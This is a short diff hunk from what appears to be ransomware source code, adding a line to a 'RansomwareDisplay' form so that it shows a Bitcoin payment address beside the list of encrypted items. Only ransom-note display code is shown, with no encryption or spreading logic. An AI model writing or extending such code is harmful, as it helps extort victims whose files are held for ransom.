@@ -267,6 +267,7 @@ public class RansomwareDisplay extends System.Windows.Forms.Form
 	private void RansomwareDisplay_Shown(Object sender, EventArgs e)
 	{
 		richTextBox1.set_Text(Globals.Encrypted.toString());
+		textBox2.set_Text(Globals.BitcoinAddr);
 	}
 
 	private void button2_Click(Object sender, EventArgs e)
